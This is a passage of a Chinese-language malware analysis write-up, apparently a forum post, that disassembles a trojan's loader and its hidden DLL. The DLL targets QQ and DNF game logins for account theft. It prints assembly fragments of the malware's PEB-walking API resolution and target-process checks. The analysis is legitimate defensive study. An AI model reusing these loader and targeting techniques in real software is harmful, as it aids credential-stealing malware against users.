+.text8:73ECC14D sub\_73ECC14D    proc near               ; CODE XREF: DllEntryPoint+13Ep  
+.text8:73ECC14D                 nop  
+.text8:73ECC14E                 pop     ecx  
+.text8:73ECC14F                 mov     eax, \[ecx+1Bh\]  
+.text8:73ECC152                 dec     eax  
+.text8:73ECC153                 mov     ebx, ebx  
+.text8:73ECC155                 add     eax, ecx  
+.text8:73ECC157                 push    eax  
+.text8:73ECC158                 add     eax, 0  
+.text8:73ECC15B                 retn  
+.text8:73ECC15B  
+.text8:73ECC15B sub\_73ECC14D    endp  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+上面的代码没有什么实质性的效果，还是看看前面那个留下的重要的 CALL 吧 CALL sub\_73ECC014  
+跟踪进入 CALL sub\_73ECC014 之后，我们看到的代码和我们在第一阶段脱壳时看到的代码基本上是一样的，如下所示：  
+.text8:73ECC01E                 push    ebp  
+.text8:73ECC01F                 mov     ebp, esp  
+.text8:73ECC021                 sub     esp, 38h  
+.text8:73ECC024                 push    ebx  
+.text8:73ECC025                 xor     eax, eax  
+.text8:73ECC027                 push    esi  
+.text8:73ECC028                 push    edi  
+.text8:73ECC029                 mov     \[ebp+var\_28\], 50746547h  
+.text8:73ECC030                 mov     \[ebp+var\_24\], 41636F72h  
+.text8:73ECC037                 mov     \[ebp+var\_20\], 65726464h  
+.text8:73ECC03E                 mov     \[ebp+var\_1C\], 7373h ; GetProcAddress  
+.text8:73ECC045                 mov     \[ebp+var\_4\], eax  
+.text8:73ECC048                 mov     \[ebp+var\_8\], eax  
+.text8:73ECC04B                 pusha  
+.text8:73ECC04C                 mov     eax, large fs:30h ; PEB  
+.text8:73ECC052                 mov     edx, \[eax+0Ch\]  ; PEB\_LDR\_DATA  
+.text8:73ECC055                 mov     eax, \[edx+1Ch\]  ; InInitializationOrderModuleList  
+.text8:73ECC058                 mov     eax, \[eax\]      ; kernel32.dll  
+.text8:73ECC05A                 mov     eax, \[eax+8\]    ; kernel32.dll 加载基址  
+.text8:73ECC05D                 mov     \[ebp+var\_4\], eax ; 将基址存入到局部变量 var\_4 中  
+.text8:73ECC060                 mov     edx, eax        ; edx = eax = kernel32.dll 加载基址  
+.text8:73ECC062                 add     eax, 21h  
+.text8:73ECC065                 add     eax, 1Bh  
+.text8:73ECC068                 mov     eax, \[eax\]      ; PE 头  
+.text8:73ECC06A                 lea     eax, \[eax+edx+78h\] ; 输出表  
+.text8:73ECC06E                 mov     eax, \[eax\]  
+.text8:73ECC070                 mov     ecx, \[edx+eax+18h\] ; 输出表函数个数  
+.text8:73ECC074                 mov     ebx, \[edx+eax+20h\] ; 函数地址  
+.text8:73ECC078                 add     ebx, edx  
+.text8:73ECC078  
+.text8:73ECC07A  
+.text8:73ECC07A loc\_73ECC07A:                           ; CODE XREF: sub\_73ECC01E+7Ej  
+.text8:73ECC07A                 dec     ecx  
+.text8:73ECC07B                 nop  
+.text8:73ECC07C                 test    ecx, ecx  
+.text8:73ECC07E                 nop  
+.text8:73ECC07F                 jz      short loc\_73ECC0BC  
+.text8:73ECC07F  
+.text8:73ECC081                 lea     edi, \[ebp+var\_28\] ; GetProcAddress  
+.text8:73ECC087                 mov     esi, \[ebx+ecx\*4\]  
+.text8:73ECC08A                 add     esi, edx  
+.text8:73ECC08C                 push    ecx  
+.text8:73ECC08D                 mov     ecx, 0Eh  
+.text8:73ECC092                 inc     ecx             ; GetProcAddress 长度  
+.text8:73ECC093                 nop  
+.text8:73ECC094                 repe cmpsb              ; 比较是不是 GetProcAddress 函数  
+.text8:73ECC096                 nop  
+.text8:73ECC097                 test    ecx, ecx  
+.text8:73ECC099                 pop     ecx  
+.text8:73ECC09A                 push    edx  
+.text8:73ECC09B                 pop     edx  
+.text8:73ECC09C                 jnz     short loc\_73ECC07A  
+.text8:73ECC09C  
+.text8:73ECC09E                 nop  
+.text8:73ECC09F                 nop  
+.text8:73ECC0A0                 mov     esi, \[edx+eax+24h\] ; 函数名称序数地址  
+.text8:73ECC0A4                 add     esi, edx  
+.text8:73ECC0A6                 mov     edi, ecx  
+.text8:73ECC0A8                 movzx   esi, word ptr \[esi+edi\*2\]  
+.text8:73ECC0AC                 mov     edi, \[edx+eax+1Ch\] ; 函数地址  
+.text8:73ECC0B0                 add     edi, edx  
+.text8:73ECC0B2                 mov     edi, \[edi+esi\*4\]  
+.text8:73ECC0B5                 add     edi, edx  
+.text8:73ECC0B7                 mov     \[ebp+var\_C\], edi  
+.text8:73ECC0BA                 jmp     short loc\_73ECC0C3  
+.text8:73ECC0BA  
+.text8:73ECC0BC ; ---------------------------------------------------------------------------  
+.text8:73ECC0BC  
+.text8:73ECC0BC loc\_73ECC0BC:                           ; CODE XREF: sub\_73ECC01E+61j  
+.text8:73ECC0BC                 mov     \[ebp+var\_C\], 0  
+.text8:73ECC0BC  
+.text8:73ECC0C3  
+.text8:73ECC0C3 loc\_73ECC0C3:                           ; CODE XREF: sub\_73ECC01E+9Cj  
+.text8:73ECC0C3                 popa  
+.text8:73ECC0C4                 mov     ecx, \[ebp+var\_4\] ; kernel32.dll 加载基址  
+.text8:73ECC0C7                 xor     edi, edi  
+.text8:73ECC0C9                 cmp     ecx, edi  
+.text8:73ECC0CB                 jz      short loc\_73ECC133  
+.text8:73ECC0CB  
+.text8:73ECC0CD                 mov     eax, \[ebp+var\_C\]  
+.text8:73ECC0D0                 cmp     eax, edi  
+.text8:73ECC0D2                 jz      short loc\_73ECC133  
+.text8:73ECC0D2  
+.text8:73ECC0D4                 lea     esi, \[ebp+var\_20\]  
+.text8:73ECC0D7                 push    esi  
+.text8:73ECC0D8                 push    ecx  
+.text8:73ECC0D9                 mov     byte ptr \[ebp+var\_20\], 4Ch  
+.text8:73ECC0DD                 mov     byte ptr \[ebp+var\_20+1\], 6Fh  
+.text8:73ECC0E1                 mov     byte ptr \[ebp+var\_20+2\], 61h  
+.text8:73ECC0E5                 mov     word ptr \[ebp+var\_20+3\], 4C64h  
+.text8:73ECC0EB                 nop  
+.text8:73ECC0EC                 nop  
+.text8:73ECC0ED                 mov     word ptr \[ebp+var\_1C+1\], 6269h  
+.text8:73ECC0F3                 nop  
+.text8:73ECC0F4                 nop  
+.text8:73ECC0F5                 mov     byte ptr \[ebp+var\_1C+3\], 72h  
+.text8:73ECC0F9                 mov     \[ebp+var\_18\], 61h  
+.text8:73ECC0FD                 mov     \[ebp+var\_17\], 72h  
+.text8:73ECC101                 mov     \[ebp+var\_16\], 4179h ; LoadLibraryA  
+.text8:73ECC107                 nop  
+.text8:73ECC108                 mov     \[ebp+var\_14\], edi  
+.text8:73ECC10B                 call    eax             ; GetProcAddress  
+.text8:73ECC10D                 push    esp  
+.text8:73ECC10E                 pop     esp  
+.text8:73ECC10F                 cmp     eax, edi  
+.text8:73ECC111                 jz      short loc\_73ECC133  ---->如果 GetProcAddress 调用失败，则转到 loc\_73ECC133  
+.text8:73ECC111  
+.text8:73ECC113                 mov     edi, eax  
+.text8:73ECC115                 call    sub\_73ECC11B    ---->关键 CALL  
+.text8:73ECC115  
+.text8:73ECC11A                 nop  
+.text8:73ECC11A  
+.text8:73ECC11A sub\_73ECC01E    endp  
+\-----------------------------------------------------------------------------------------------------------  
+.text8:73ECC133 loc\_73ECC133:                           ; CODE XREF: sub\_73ECC01E+ADj  
+.text8:73ECC133                                         ; sub\_73ECC01E+B4j  
+.text8:73ECC133                                         ; sub\_73ECC01E+F3j  
+.text8:73ECC133                                         ; sub\_73ECC11B+9j  
+.text8:73ECC133                 pop     edi  
+.text8:73ECC134                 pop     esi  
+.text8:73ECC135                 nop  
+.text8:73ECC136                 pop     ebx  
+.text8:73ECC137                 mov     esp, ebp  
+.text8:73ECC139                 pop     ebp  
+.text8:73ECC13A                 nop  
+.text8:73ECC13B                 retn      ------>恢复堆栈返回  
+\-----------------------------------------------------------------------------------------------------------  
+这里我们进入前面的关键 CALL 进行分析~~~  
+.text8:73ECC11B sub\_73ECC11B    proc near               ; CODE XREF: sub\_73ECC01E+F7p  
+.text8:73ECC11B                 pop     ebx  
+.text8:73ECC11C                 lea     esi, \[ebx+4Ah\]  
+.text8:73ECC11F                 nop  
+.text8:73ECC11F  
+.text8:73ECC120  
+.text8:73ECC120 loc\_73ECC120:                           ; CODE XREF: sub\_73ECC11B+16j  
+.text8:73ECC120                 mov     cl, \[esi\]  
+.text8:73ECC122                 test    cl, cl  
+.text8:73ECC124                 jz      short loc\_73ECC133  
+.text8:73ECC124  
+.text8:73ECC126                 lea     edx, \[esi+6\]  
+.text8:73ECC129                 push    edx  
+.text8:73ECC12A                 call    edi          
+.text8:73ECC12C                 nop  
+.text8:73ECC12D                 add     esi, 6Ah  
+.text8:73ECC130                 nop  
+.text8:73ECC131                 jmp     short loc\_73ECC120  
+.text8:73ECC131  
+.text8:73ECC133 ; ---------------------------------------------------------------------------  
+.text8:73ECC133  
+.text8:73ECC133 loc\_73ECC133:                           ; CODE XREF: sub\_73ECC01E+ADj  
+.text8:73ECC133                                         ; sub\_73ECC01E+B4j  
+.text8:73ECC133                                         ; sub\_73ECC01E+F3j  
+.text8:73ECC133                                         ; sub\_73ECC11B+9j  
+.text8:73ECC133                 pop     edi  
+.text8:73ECC134                 pop     esi  
+.text8:73ECC135                 nop  
+.text8:73ECC136                 pop     ebx  
+.text8:73ECC137                 mov     esp, ebp  
+.text8:73ECC139                 pop     ebp  
+.text8:73ECC13A                 nop  
+.text8:73ECC13B                 retn  
+.text8:73ECC13B  
+.text8:73ECC13B sub\_73ECC11B    endp ; sp =  4  
+\-------------------------------------------------------------------------------------------  
+程序最后将一些数据也写入到了 DLL 中，我们来看看它可以为我们做什么吧~~~~  
+.text8:73ECC15C                 db  55h ; U  
+.text8:73ECC15D                 db 8Bh, 46h, 56h  
+.text8:73ECC160                 db 0FAh ; ?  
+.text8:73ECC161                 db 0FFh, 2 dup(90h)  
+.text8:73ECC164                 db    1  
+.text8:73ECC165                 db 78h, 4Dh, 59h  
+.text8:73ECC168                 db    0  
+.text8:73ECC169                 align 2  
+.text8:73ECC16A s\_CProgramFiles db 'C:\\Program Files\\Common Files\\System\\kb011595.bwb',0  
+.text8:73ECC19C                 dd 199h dup(0)  
+.text8:73ECC800                 dd 200h dup(?)  
+.text8:73ECC800 \_text8          ends  
+通过上面的数据我们可以得到，可能主程序会读取这里的数据然后使 DLL 返回到系统调用中，还会调用被存入在  
+C:\\Program Files\\Common Files\\System\\kb011595.bwb，这里很明显了，和我们前面的分析相结合，可以得到，主程序会通过这个 DLL 得到存放在 C:\\Program   
+  
+Files\\Common Files\\System\\kb011595.bwb 的文件，然后读取其中的一些数据，再进行相关的操作~~~~  
+  
+那我们去重新看看，我们以前生成的那个 kb011595.sve 吧，看看它到底是什么~~~  
+前面我们只是草草的看了看，这里我们在仔细分析，因为主要的盗号功能就在这个文件中 kb011595.bwb 中，现在我突然明白了，前面的代码的  
+我标记的重点位置 LoadDLL，原来是为了加载这个重要的东西的，现在我算是明白过来了~~~~真正的重点是在这个文件中，我也不知道我分析的正不正确，请大牛们指  
+  
+点一二~~~  
+  
+上面用到了 LoadDLL，说明 kb011595.bwb 是一个动态链接库，我们用 C32ASM 看查看一个这个文件吧~~~看看它是不是真的是 DLL  
+![](img/8a4872010e391634e96cd4ad48e60179.jpg)  
+现在我终于明白了，原来一切邪恶的东西都只是在这个隐藏文件中，并且这个文件经过压缩加壳~~~~  
+既然它是 DLL，我们就不如把它改为 DLL，然后用 OD 载入看看~~~  
+  
+然后既然是 UPX0 加的壳，我就用 ESP 定律看看~~~结果发现了入口点，但没能成功脱壳~~~~  
+先不管了，慢慢来，我们就一步一步分析看看，它这个 DLL 中的代码究竟做了哪些工作!!!!![](img/f3773294bf3a914c9a8c0c242528a003.jpg "使眼色")  
+10004F3E   55               PUSH EBP  
+10004F3F   8BEC             MOV EBP,ESP  
+10004F41   81EC 1C010000    SUB ESP,11C  
+10004F47   8B45 0C          MOV EAX,DWORD PTR SS:\[EBP+C\]  
+10004F4A   56               PUSH ESI  
+10004F4B   48               DEC EAX  
+10004F4C   57               PUSH EDI  
+10004F4D   85C0             TEST EAX,EAX  
+10004F4F   0F85 45010000    JNZ kb418577.1000509A  
+10004F55   8B45 08          MOV EAX,DWORD PTR SS:\[EBP+8\]  
+10004F58   8B35 68700010    MOV ESI,DWORD PTR DS:\[10007068\]          ; kernel32.GetModuleFileNameA  
+10004F5E   53               PUSH EBX  
+10004F5F   BB 04010000      MOV EBX,104  
+10004F64   53               PUSH EBX  
+10004F65   68 00B06510      PUSH kb418577.1065B000  
+10004F6A   50               PUSH EAX  
+10004F6B   A3 F8AF6510      MOV DWORD PTR DS:\[1065AFF8\],EAX  
+10004F70   FFD6             CALL ESI  
+10004F72   80A5 E4FEFFFF 00 AND BYTE PTR SS:\[EBP-11C\],0  
+10004F79   6A 40            PUSH 40  
+10004F7B   59               POP ECX  
+10004F7C   33C0             XOR EAX,EAX  
+10004F7E   8DBD E5FEFFFF    LEA EDI,DWORD PTR SS:\[EBP-11B\]  
+10004F84   8065 FE 00       AND BYTE PTR SS:\[EBP-2\],0  
+10004F88   F3:AB            REP STOS DWORD PTR ES:\[EDI\]  
+10004F8A   66:AB            STOS WORD PTR ES:\[EDI\]  
+10004F8C   AA               STOS BYTE PTR ES:\[EDI\]  
+10004F8D   8D85 E4FEFFFF    LEA EAX,DWORD PTR SS:\[EBP-11C\]  
+10004F93   53               PUSH EBX  
+10004F94   33FF             XOR EDI,EDI  
+10004F96   50               PUSH EAX  
+10004F97   57               PUSH EDI  
+前面的一堆我就不解释了，只看重点代码~~~  
+10004F98   C645 F4 63       MOV BYTE PTR SS:\[EBP-C\],63  
+10004F9C   C645 F5 74       MOV BYTE PTR SS:\[EBP-B\],74  
+10004FA0   C645 F6 66       MOV BYTE PTR SS:\[EBP-A\],66  
+10004FA4   C645 F7 6D       MOV BYTE PTR SS:\[EBP-9\],6D  
+10004FA8   C645 F8 6F       MOV BYTE PTR SS:\[EBP-8\],6F  
+10004FAC   C645 F9 6E       MOV BYTE PTR SS:\[EBP-7\],6E  
+10004FB0   C645 FA 2E       MOV BYTE PTR SS:\[EBP-6\],2E  
+10004FB4   C645 FB 65       MOV BYTE PTR SS:\[EBP-5\],65  
+10004FB8   C645 FC 78       MOV BYTE PTR SS:\[EBP-4\],78  
+10004FBC   C645 FD 65       MOV BYTE PTR SS:\[EBP-3\],65               ; ctfmon.exe  
+10004FC0   FFD6             CALL ESI                                 ; GetModuleFileNameA  
+得到 ctfmon.exe 的路径  
+10005035   E8 1D0A0000      CALL kb418577.10005A57  
+1000503A   59               POP ECX  
+1000503B   85C0             TEST EAX,EAX  
+1000503D   59               POP ECX  
+1000503E   74 4A            JE SHORT kb418577.1000508A  
+10005040   FF35 58880010    PUSH DWORD PTR DS:\[10008858\]             ; kb418577.10008850  
+10005046   56               PUSH ESI  
+10005047   E8 0B0A0000      CALL kb418577.10005A57  
+1000504C   59               POP ECX  
+1000504D   85C0             TEST EAX,EAX  
+1000504F   59               POP ECX  
+10005050   74 38            JE SHORT kb418577.1000508A  
+10005052   FF35 5C880010    PUSH DWORD PTR DS:\[1000885C\]             ; kb418577.10008850  
+10005058   56               PUSH ESI  
+10005059   E8 F9090000      CALL kb418577.10005A57  
+1000505E   59               POP ECX  
+1000505F   85C0             TEST EAX,EAX  
+10005061   59               POP ECX  
+10005062   74 26            JE SHORT kb418577.1000508A  
+10005064   68 60880010      PUSH kb418577.10008860                   ; ASCII "QQLogin.exe"  
+10005069   56               PUSH ESI  
+1000506A   E8 E8090000      CALL kb418577.10005A57  
+1000506F   59               POP ECX  
+10005070   85C0             TEST EAX,EAX  
+10005072   59               POP ECX  
+10005073   74 11            JE SHORT kb418577.10005086  
+10005075   68 6C880010      PUSH kb418577.1000886C                   ; ASCII "DNF.exe"  
+1000507A   56               PUSH ESI  
+1000507B   E8 D7090000      CALL kb418577.10005A57  
+10005080   59               POP ECX  
+10005081   85C0             TEST EAX,EAX  
+10005083   59               POP ECX  
+10005084   75 14            JNZ SHORT kb418577.1000509A  
+10005086   33C0             XOR EAX,EAX  
+10005088   EB 13            JMP SHORT kb418577.1000509D  
+1000508A   57               PUSH EDI  
+1000508B   57               PUSH EDI  
+1000508C   57               PUSH EDI  
+1000508D   68 A3500010      PUSH kb418577.100050A3  
+10005092   57               PUSH EDI  
+10005093   57               PUSH EDI  
+10005094   FF15 64700010    CALL DWORD PTR DS:\[10007064\]             ; kernel32.CreateThread  
+1000509A   6A 01            PUSH 1  
+1000509C   58               POP EAX  
+1000509D   5F               POP EDI  
+1000509E   5E               POP ESI  
+1000509F   C9               LEAVE  
+  
+今天就到这里了，本来以为这三篇讲完了，这个木马就结束了，没想到，真正的幕后黑手才被我刚刚找到，现在终于明白前面在调试时遇到的一些问题了~~~~  
+  
+先放这三篇了，这个“简单”的 kb011595.bwb，似乎一点也不简单，里面不仅有很多反调试的技术，还用到了其它的一些 Uthxeme 等 DLL，我大概调试了一下，果然不  
+  
+简单~~  
+  
+  
+因为手冷的实在不行了，打不动字了，就先在这结束，肚子也饿了，吃饱了，回来我继续接着干，如果有大牛看到请指点一下，如果大牛们都没时间，小弟只好在拼  
+  
+命搞啦~~~  
+  
+就当作上篇吧，我想那简单的 kb011595.bwb 的内容足已可以去写下篇了，嘿嘿~~~~  
+  
+花了足足十多个小时，原来才找到真像，不过很开心，至于现在知道了幕后黑手~~~我会继续的，也希望大家给在后面指点指点~~![](img/c1d8523a7842d7b67917c210ac6dcf18.jpg "微笑")  
+  
+  
+本来想搞成 PDF，不过好像格式不好看就直接贴上来，还好看一点~~~~如果情愿看 PDF，附件中也有，排版有点乱，大家就将就的看吧~~![](img/906f120cfe711ccbc8463fd6eb86eee9.jpg "尴尬")
+
+上传的附件| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || 附件.rar\[解压密码：muma\]  
+ |
